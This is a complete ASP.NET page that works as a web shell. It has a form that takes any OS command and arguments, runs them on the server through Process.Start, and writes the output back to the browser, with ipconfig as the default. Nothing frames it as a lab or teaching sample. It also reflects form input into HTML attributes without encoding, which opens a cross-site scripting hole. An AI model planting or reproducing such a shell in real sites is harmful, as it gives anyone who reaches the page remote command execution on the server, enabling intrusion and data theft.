<%@ Page Language="C#" %>
<!DOCTYPE html>
<html>
<head>
    <title>Run Command</title>
    <style>
        body {
            font-family: Consolas, monospace;
            background: #f0f0f0;
            padding: 40px;
        }
        textarea {
            width: 100%;
            height: 300px;
            background: #fff;
            color: #000;
            padding: 10px;
            white-space: pre;
            font-size: 14px;
        }
    </style>
</head>
<body>
    <h2>Run OS Command</h2>
    <form method="post">
        <label>Command:</label><br/>
        <input type="text" name="cmd" value="<%= Request.Form["cmd"] %>" /><br/>
        <label>Arguments:</label><br/>
        <input type="text" name="args" value="<%= Request.Form["args"] %>" /><br/>
        <button type="submit">Run</button>
    </form>

    <h3>Output:</h3>
    <textarea readonly>
<%
    if (IsPostBack)
    {
        string cmd = Request.Form["cmd"];
        string args = Request.Form["args"];

        Response.Write("Command: " + Server.HtmlEncode(cmd) + "\n");
        Response.Write("Arguments: " + Server.HtmlEncode(args) + "\n\n");

        if (string.IsNullOrWhiteSpace(cmd))
        {
            Response.Write("⚠️ No command entered. Defaulting to ipconfig.\n\n");
            cmd = "ipconfig";
            args = "";
        }

        try
        {
            System.Diagnostics.ProcessStartInfo psi = new System.Diagnostics.ProcessStartInfo();
            psi.FileName = cmd;
            psi.Arguments = args;
            psi.RedirectStandardOutput = true;
            psi.RedirectStandardError = true;
            psi.UseShellExecute = false;
            psi.CreateNoWindow = true;

            using (System.Diagnostics.Process process = System.Diagnostics.Process.Start(psi))
            {
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();

                string full = output + (string.IsNullOrWhiteSpace(error) ? "" : "\n[ERROR]\n" + error);
                Response.Write(Server.HtmlEncode(full));
            }
        }
        catch (Exception ex)
        {
            Response.Write("ERROR: " + Server.HtmlEncode(ex.Message));
        }
    }
%>
    </textarea>
</body>
</html>
